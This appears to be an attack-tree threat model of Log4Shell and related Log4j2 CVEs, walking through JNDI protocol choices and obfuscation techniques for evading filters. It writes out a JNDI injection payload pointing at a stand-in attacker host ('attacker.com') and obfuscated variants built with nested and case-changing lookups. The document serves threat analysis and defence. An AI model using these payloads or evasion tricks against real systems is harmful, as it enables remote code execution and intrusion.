# Attack Tree Analysis for apache/logging-log4j2

Objective: [[Attacker Goal: Achieve RCE via Log4j2]]

## Attack Tree Visualization

                                      [[Attacker Goal: Achieve RCE via Log4j2]]
                                                    ||
                                                    ||
        -------------------------------------------------
        ||
[[Exploit Log4j2 Vulnerabilities]]
        ||
        ||-------------------------
        ||
[[Log4Shell (CVE-2021-44228 & related)]]
        ||
        ||-------------------------
        ||                       ||
[[Craft Malicious  [[Bypass  Lookups]]
   JNDI Payload]]    [Format String]]
        ||                       ||
        ||                       ||
[LDAP] ===>[RMI] [DNS] [IIOP] ===>[No Lookups]
                                 ===>[Use %${::-${}} ]
                                 ===>[Use ${lower:X}]
                                 ===>[Use ${upper:X}]
                                 ===>[Obfuscation]

## Attack Tree Path: [[[Attacker Goal: Achieve RCE via Log4j2]]](./attack_tree_paths/__attacker_goal_achieve_rce_via_log4j2__.md)

*   **Description:** The attacker's ultimate objective is to gain Remote Code Execution (RCE) on the target server by exploiting vulnerabilities in the application's use of Log4j2. RCE allows the attacker to execute arbitrary commands, potentially leading to complete system compromise.
*   **Impact:** Very High. Complete system takeover, data exfiltration, lateral movement within the network.

## Attack Tree Path: [[[Exploit Log4j2 Vulnerabilities]]](./attack_tree_paths/__exploit_log4j2_vulnerabilities__.md)

*   **Description:** This is the overarching approach. The attacker seeks to leverage weaknesses in Log4j2 to achieve their goal. This node represents the entry point for all Log4j2-specific attacks.
*   **Impact:** Very High (as it leads to the goal).

## Attack Tree Path: [[[Log4Shell (CVE-2021-44228 & related)]]](./attack_tree_paths/__log4shell__cve-2021-44228_&_related___.md)

*   **Description:** This refers to the infamous Log4Shell vulnerability and its close variants.  It involves Log4j2's JNDI lookup feature, which, when triggered by a malicious log message, can connect to an attacker-controlled server and execute arbitrary code.
*   **Vulnerability Details:**
    *   **CVE-2021-44228:** The original Log4Shell vulnerability.
    *   **CVE-2021-45046:** A related vulnerability that could bypass initial fixes.
    *   **CVE-2021-45105:** Another related vulnerability involving denial of service.
*   **Impact:** Very High (RCE).

## Attack Tree Path: [[[Craft Malicious JNDI Payload]]](./attack_tree_paths/__craft_malicious_jndi_payload__.md)

*   **Description:** The attacker constructs a specially crafted string that, when processed by Log4j2's logging mechanism, triggers a JNDI lookup. This lookup connects to a malicious server (e.g., LDAP, RMI) controlled by the attacker. The malicious server then provides a payload that leads to RCE.
*   **Example Payload (Basic):** `${jndi:ldap://attacker.com/a}`
*   **Impact:** High (Essential step for JNDI injection).

## Attack Tree Path: [[[Bypass Lookups Format String]]](./attack_tree_paths/__bypass_lookups_format_string__.md)

*   **Description:** Attackers use various techniques to obfuscate the malicious JNDI payload and evade simple string-matching defenses (like basic WAF rules or input validation). This node represents the attacker's attempts to circumvent security measures.
*   **Impact:** High (Allows the malicious payload to reach Log4j2).

## Attack Tree Path: [High-Risk Path: `[LDAP] ===> [RMI] ... ===> [Obfuscation]`](./attack_tree_paths/high-risk_path___ldap__===__rmi______===__obfuscation__.md)

*   **Description:** This is the most common and dangerous attack path. It combines crafting a malicious JNDI payload with using common JNDI protocols (LDAP, RMI) and then applying obfuscation techniques.
*   **Steps:**
    1.  **JNDI Protocol Selection ([LDAP], [RMI], [DNS], [IIOP]):**
        *   **LDAP:** The most frequently used protocol in Log4Shell attacks.  The attacker sets up a malicious LDAP server to deliver the exploit payload.
        *   **RMI:** Another common protocol.  Similar to LDAP, but uses Java Remote Method Invocation.
        *   **DNS:** Less common, but can be used to exfiltrate data or trigger lookups.
        *   **IIOP:**  Another, less frequently used, JNDI protocol.
    2.  **Obfuscation ([Use %${::-${}} ], [Use ${lower:X}], [Use ${upper:X}], [Obfuscation]):**
        *   **`%${::-${}}`:** Nested lookups. This bypasses simple string matching by embedding the malicious JNDI string within another lookup.
        *   **`${lower:X}` and `${upper:X}`:**  These lookup functions convert the input to lowercase or uppercase, respectively.  Attackers can use this to change the case of the JNDI string and evade case-sensitive detection.
        *   **General Obfuscation:**  This includes techniques like URL encoding, character encoding, and using unusual characters to make the payload harder to recognize.  For example, `${jndi:l${lower:d}ap://...}`.
    3. **[No Lookups]:**
        *   Even if lookups are disabled, there might be other vulnerabilities.
*   **Impact:** Very High (Direct path to RCE if successful).

